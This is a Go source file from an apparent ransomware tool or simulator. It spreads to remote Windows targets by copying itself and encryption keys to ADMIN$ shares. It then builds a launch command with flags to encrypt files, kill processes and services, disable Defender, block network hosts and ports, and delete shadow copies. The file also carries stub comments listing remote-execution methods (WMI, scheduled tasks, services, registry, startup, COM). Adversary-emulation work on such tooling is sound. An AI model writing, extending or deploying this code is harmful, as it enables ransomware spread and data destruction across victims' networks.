package main

import (
	"fmt"
	"io"
	"os"
	"sync"
)

func handleRemoteTargets(targets []string, args map[string]any, extension string, notename string, note string, group RansomActor, cipher string) {
	wg := sync.WaitGroup{}
	for _, target := range targets {
		wg.Add(1)
		target := target
		go func() {
			defer wg.Done()

			fmt.Println("Starting on target: ", target)
			copyName := RandStringBytes(12)
			copyName += ".exe"
			commandLine := ""
			executableLocation := fmt.Sprintf("\\\\%s\\ADMIN$\\%s", target, copyName)
			keyLocation := fmt.Sprintf("\\\\%s\\ADMIN$\\%s", target, RandStringBytes(12))
			if args["ecc_public"].(string) != "" {
				f, err := os.Create(keyLocation)
				if err != nil {
					printFormattedMessage(fmt.Sprintf("Failed to create key file on target %s: %s", target, err.Error()), ERROR)
					return
				}
				i, err := os.Open(args["ecc_public"].(string))
				if err != nil {
					printFormattedMessage(fmt.Sprintf("Failed to open key file %s: %s", args["ecc_public"].(string), err.Error()), ERROR)
					return
				}
				_, err = io.Copy(f, i)
				if err != nil {
					printFormattedMessage(fmt.Sprintf("Failed to copy key file %s to target %s: %s", args["ecc_public"].(string), target, err.Error()), ERROR)
					return
				}
			}
			if args["rsa_public"].(string) != "" {
				f, err := os.Create(keyLocation)
				if err != nil {
					printFormattedMessage(fmt.Sprintf("Failed to create key file on target %s: %s", target, err.Error()), ERROR)
					return
				}
				i, err := os.Open(args["rsa_public"].(string))
				if err != nil {
					printFormattedMessage(fmt.Sprintf("Failed to open key file %s: %s", args["rsa_public"].(string), err.Error()), ERROR)
					return
				}
				_, err = io.Copy(f, i)
				if err != nil {
					printFormattedMessage(fmt.Sprintf("Failed to copy key file %s to target %s: %s", args["rsa_public"].(string), target, err.Error()), ERROR)
					return
				}
			}
			err := copySelf(executableLocation)
			if err != nil {
				printFormattedMessage(fmt.Sprintf("Failed to copy self to target %s: %s", target, err.Error()), ERROR)
				// Theoretically we could encode exe as b64 and try to drop via powershell but let's not worry about this now
				return
			}
			commandLine = executableLocation
			commandLine = fmt.Sprintf("%s -skipconfirm -directory \"%s\"", commandLine, args["target"].(string))
			if args["recursive"].(bool) {
				commandLine = fmt.Sprintf("%s -recursive", commandLine)
			}
			commandLine = fmt.Sprintf("%s -force_note_name %s -force_extension %s -cipher %s -group %s -method %s", commandLine, notename, extension, cipher, group.Group, args["method"].(string))
			commandLine = fmt.Sprintf("%s -ep %d", commandLine, args["encryption_percent"].(int))
			commandLine = fmt.Sprintf("%s -threshold %d", commandLine, args["threshold_auto_fullencrypt"].(int64))
			commandLine = fmt.Sprintf("%s -workers %d", commandLine, args["workers"].(int))
			if args["killprocs"].(bool) {
				commandLine = fmt.Sprintf("%s -killprocs", commandLine)
			}
			if args["killservices"].(bool) {
				commandLine = fmt.Sprintf("%s -killservices", commandLine)
			}
			if args["defender"].(bool) {
				commandLine = fmt.Sprintf("%s -defender", commandLine)
			}
			if args["blockhosts"].(bool) {
				commandLine = fmt.Sprintf("%s -blockhosts", commandLine)
			}
			if args["blockports"].(bool) {
				commandLine = fmt.Sprintf("%s -blockports", commandLine)
			}
			if args["vss"].(bool) {
				commandLine = fmt.Sprintf("%s -vss", commandLine)
			}
			if args["rsa_public"].(string) != "" {
				commandLine = fmt.Sprintf("%s -rsa_public %s", commandLine, keyLocation)
			} else if args["ecc_public"].(string) != "" {
				commandLine = fmt.Sprintf("%s -ecc_public %s", commandLine, keyLocation)
			}
			fmt.Println(commandLine)
		}()
	}
	printFormattedMessage("Waiting for all remote targets to startup", INFO)
	wg.Wait()
}

func execute() {
	// If wmi, we will launch a process remotely
	// If task, we will create a remote scheduled task and immediately invoke
	// If service, we will create a remote sece and immediately invokervi
	// If reg, will set a startup item in the registry to launch at next logon
	// If startup, will use startup folder
	// If mmc, wil use specific COM methodology
}
